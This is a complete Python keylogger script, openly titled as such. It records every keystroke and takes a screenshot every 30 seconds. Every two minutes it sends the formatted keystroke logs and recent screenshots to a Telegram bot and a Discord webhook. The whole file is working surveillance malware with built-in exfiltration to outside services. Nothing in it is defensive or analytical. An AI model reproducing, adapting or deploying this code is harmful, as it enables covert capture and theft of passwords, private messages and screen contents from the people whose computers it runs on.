"""
Keyboard Logger with Screenshots + Telegram & Discord Bot
Sends formatted logs WITH SCREENSHOTS to Telegram/Discord every 2 minutes
Press 'ESC' to stop the program
"""

from pynput import keyboard
import os
import threading
import requests
from datetime import datetime
import time
from PIL import ImageGrab
import io

# ============================================================================
# CONFIGURATION - EDIT THESE VALUES
# ============================================================================

# Telegram Configuration
TELEGRAM_BOT_TOKEN = ""  # Get from @BotFather
TELEGRAM_CHAT_ID = ""      # Your chat/channel ID

# Discord Configuration
DISCORD_WEBHOOK_URL = " # From Discord channel settings"

# General Settings
TEMP_FOLDER = "temp"
SCREENSHOTS_FOLDER = os.path.join(TEMP_FOLDER, "screenshots")
UPLOAD_INTERVAL = 120  # 2 minutes in seconds
ENABLE_TELEGRAM = True   # Set to False to disable Telegram
ENABLE_DISCORD = True    # Set to False to disable Discord
ENABLE_SCREENSHOTS = True  # Set to False to disable screenshots

# Screenshot Settings
SCREENSHOT_INTERVAL = 30  # Take screenshot every 30 seconds
MAX_SCREENSHOTS_PER_REPORT = 4  # Maximum screenshots to send per report

# ============================================================================

# Create folders if they don't exist
if not os.path.exists(TEMP_FOLDER):
    os.makedirs(TEMP_FOLDER)
if not os.path.exists(SCREENSHOTS_FOLDER):
    os.makedirs(SCREENSHOTS_FOLDER)

# Create log files with timestamp
session_timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
RAW_LOG_FILE = os.path.join(TEMP_FOLDER, f"keylog_raw_{session_timestamp}.txt")
FORMATTED_LOG_FILE = os.path.join(TEMP_FOLDER, f"keylog_formatted_{session_timestamp}.txt")

# Flag to control threads
running = True
start_time = datetime.now()
screenshot_list = []

def capture_screenshot():
    """Capture a screenshot and save it"""
    if not ENABLE_SCREENSHOTS:
        return None
    
    try:
        # Capture screenshot
        screenshot = ImageGrab.grab()
        
        # Create filename with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        filename = os.path.join(SCREENSHOTS_FOLDER, f"screenshot_{timestamp}.png")
        
        # Save screenshot
        screenshot.save(filename, "PNG")
        
        # Add to list
        screenshot_list.append(filename)
        
        print(f"[{datetime.now().strftime('%H:%M:%S')}] 📸 Screenshot captured: {os.path.basename(filename)}")
        
        return filename
        
    except Exception as e:
        print(f"❌ Error capturing screenshot: {e}")
        return None

def screenshot_thread():
    """Background thread that captures screenshots periodically"""
    global running
    while running:
        time.sleep(SCREENSHOT_INTERVAL)
        if running:
            capture_screenshot()

def format_log_file():
    """Format the raw log file into a proper, readable format"""
    if not os.path.exists(RAW_LOG_FILE):
        return ""
    
    try:
        with open(RAW_LOG_FILE, 'r') as f:
            raw_content = f.read()
        
        if not raw_content.strip():
            return ""
        
        # Create formatted version
        formatted_text = ""
        formatted_text += "═" * 50 + "\n"
        formatted_text += "📋 KEYBOARD ACTIVITY LOG\n"
        formatted_text += "═" * 50 + "\n\n"
        
        # Session information
        formatted_text += f"🕐 Session Start: {start_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        formatted_text += f"📅 Report Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        formatted_text += f"⏱️ Duration: {(datetime.now() - start_time).seconds // 60} minutes\n"
        formatted_text += f"📸 Screenshots: {len(screenshot_list)} captured\n"
        formatted_text += "\n" + "─" * 50 + "\n\n"
        
        # Content
        formatted_text += "⌨️ CAPTURED KEYSTROKES:\n"
        formatted_text += "─" * 50 + "\n\n"
        
        # Clean up content
        formatted_content = raw_content
        formatted_content = formatted_content.replace('[BACKSPACE]', '←')
        formatted_content = formatted_content.replace('[SHIFT]', '')
        formatted_content = formatted_content.replace('[DELETE]', '⌫')
        
        formatted_text += formatted_content
        
        # Footer
        formatted_text += "\n\n" + "─" * 50 + "\n"
        formatted_text += f"📊 Total Characters: {len(raw_content)}\n"
        formatted_text += "═" * 50
        
        # Save formatted file
        with open(FORMATTED_LOG_FILE, 'w') as f:
            f.write(formatted_text)
        
        return formatted_text
        
    except Exception as e:
        print(f"❌ Error formatting log: {e}")
        return ""

def get_recent_screenshots():
    """Get the most recent screenshots for sending"""
    if not screenshot_list:
        return []
    
    # Return the last N screenshots
    return screenshot_list[-MAX_SCREENSHOTS_PER_REPORT:]

def send_to_telegram(message_text):
    """Send formatted log with screenshots to Telegram"""
    if not ENABLE_TELEGRAM:
        return False
    
    try:
        # Send text log first
        if len(message_text) > 4000:
            # Send as document if too long
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
            with open(FORMATTED_LOG_FILE, 'rb') as f:
                files = {'document': f}
                data = {
                    'chat_id': TELEGRAM_CHAT_ID,
                    'caption': f"📋 Keyboard Log Report\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                }
                response = requests.post(url, files=files, data=data, timeout=10)
        else:
            # Send as text message
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message_text,
            }
            response = requests.post(url, json=data, timeout=10)
        
        # Send screenshots as media group
        screenshots = get_recent_screenshots()
        if screenshots and ENABLE_SCREENSHOTS:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMediaGroup"
            
            media = []
            files_dict = {}
            
            for idx, screenshot_path in enumerate(screenshots):
                if os.path.exists(screenshot_path):
                    file_key = f"photo{idx}"
                    files_dict[file_key] = open(screenshot_path, 'rb')
                    
                    media_item = {
                        'type': 'photo',
                        'media': f'attach://{file_key}'
                    }
                    
                    if idx == 0:
                        media_item['caption'] = f"📸 Screenshots ({len(screenshots)} total)"
                    
                    media.append(media_item)
            
            if media:
                data = {
                    'chat_id': TELEGRAM_CHAT_ID,
                    'media': str(media).replace("'", '"')
                }
                
                response = requests.post(url, data=data, files=files_dict, timeout=30)
                
                # Close all file handles
                for f in files_dict.values():
                    f.close()
        
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ✓ Telegram: Sent successfully")
        return True
            
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Telegram error: {e}")
        return False

def send_to_discord(message_text):
    """Send formatted log with screenshots to Discord"""
    if not ENABLE_DISCORD:
        return False
    
    try:
        # Prepare message
        if len(message_text) > 1900:
            # Send as file attachment if too long
            files = {
                'file1': (os.path.basename(FORMATTED_LOG_FILE), 
                         open(FORMATTED_LOG_FILE, 'rb'), 
                         'text/plain')
            }
            content = f"📋 **Keyboard Log Report**\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        else:
            # Send as text
            files = {}
            content = f"```\n{message_text}\n```"
        
        # Add screenshots
        screenshots = get_recent_screenshots()
        if screenshots and ENABLE_SCREENSHOTS:
            for idx, screenshot_path in enumerate(screenshots[:10]):  # Discord limit
                if os.path.exists(screenshot_path):
                    file_key = f'file{idx + 2}'
                    files[file_key] = (os.path.basename(screenshot_path),
                                      open(screenshot_path, 'rb'),
                                      'image/png')
        
        # Send everything
        data = {'content': content}
        response = requests.post(DISCORD_WEBHOOK_URL, data=data, files=files, timeout=30)
        
        # Close file handles
        for f in files.values():
            if hasattr(f[1], 'close'):
                f[1].close()
        
        if response.status_code in [200, 204]:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] ✓ Discord: Sent successfully")
            return True
        else:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] ⚠ Discord error: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Discord error: {e}")
        return False

def send_logs():
    """Format and send logs with screenshots to enabled platforms"""
    formatted_text = format_log_file()
    
    if not formatted_text:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ℹ️ No data to send yet")
        return
    
    success_count = 0
    
    # Send to Telegram
    if ENABLE_TELEGRAM:
        if send_to_telegram(formatted_text):
            success_count += 1
    
    # Send to Discord
    if ENABLE_DISCORD:
        if send_to_discord(formatted_text):
            success_count += 1
    
    if success_count > 0:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] 📤 Sent to {success_count} platform(s)")

def upload_thread():
    """Background thread that sends logs every interval"""
    global running
    while running:
        time.sleep(UPLOAD_INTERVAL)
        if running:
            send_logs()

def on_press(key):
    """Called when a key is pressed - saves to file"""
    try:
        # For regular character keys
        with open(RAW_LOG_FILE, 'a') as f:
            f.write(key.char)
    except AttributeError:
        # For special keys
        with open(RAW_LOG_FILE, 'a') as f:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.tab:
                f.write('\t')
            elif key == keyboard.Key.backspace:
                f.write('[BACKSPACE]')
            elif key == keyboard.Key.delete:
                f.write('[DELETE]')
            elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                f.write('[SHIFT]')
            else:
                f.write(f'[{key.name.upper()}]')

def on_release(key):
    """Called when a key is released"""
    global running
    if key == keyboard.Key.esc:
        with open(RAW_LOG_FILE, 'a') as f:
            f.write('\n[ESC - Program Stopped]\n')
        running = False
        return False

def main():
    global running
    
    # Show configuration
    print("=" * 70)
    print("🤖 KEYBOARD LOGGER WITH SCREENSHOTS + TELEGRAM & DISCORD")
    print("=" * 70)
    print(f"\n📁 Raw log: {os.path.abspath(RAW_LOG_FILE)}")
    print(f"📄 Formatted log: {os.path.abspath(FORMATTED_LOG_FILE)}")
    print(f"📸 Screenshots: {os.path.abspath(SCREENSHOTS_FOLDER)}")
    print(f"\n🔧 PLATFORM STATUS:")
    print(f"  {'✅' if ENABLE_TELEGRAM else '❌'} Telegram: {'Enabled' if ENABLE_TELEGRAM else 'Disabled'}")
    print(f"  {'✅' if ENABLE_DISCORD else '❌'} Discord: {'Enabled' if ENABLE_DISCORD else 'Disabled'}")
    print(f"  {'✅' if ENABLE_SCREENSHOTS else '❌'} Screenshots: {'Enabled' if ENABLE_SCREENSHOTS else 'Disabled'}")
    print(f"\n⏱️  Upload interval: {UPLOAD_INTERVAL} seconds")
    print(f"📸 Screenshot interval: {SCREENSHOT_INTERVAL} seconds")
    print(f"🕐 Session started: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("\n⌨️  Press ESC to stop\n")
    print("-" * 70 + "\n")
    
    # Verify at least one platform is enabled
    if not ENABLE_TELEGRAM and not ENABLE_DISCORD:
        print("⚠️  WARNING: Both Telegram and Discord are disabled!")
        print("   Enable at least one platform in the configuration.\n")
    
    # Start upload thread
    upload_worker = threading.Thread(target=upload_thread, daemon=True)
    upload_worker.start()
    
    # Start screenshot thread
    if ENABLE_SCREENSHOTS:
        screenshot_worker = threading.Thread(target=screenshot_thread, daemon=True)
        screenshot_worker.start()
    
    # Run keyboard listener
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
    
    # Final upload when stopping
    print("\n" + "-" * 70)
    print("📤 Sending final report with screenshots to bot(s)...")
    send_logs()
    
    print(f"\n✅ Logger stopped successfully")
    print(f"📁 Files saved in: {os.path.abspath(TEMP_FOLDER)}")
    print(f"📸 Screenshots: {len(screenshot_list)} captured")
    print("=" * 70 + "\n")

if __name__ == "__main__":
    main()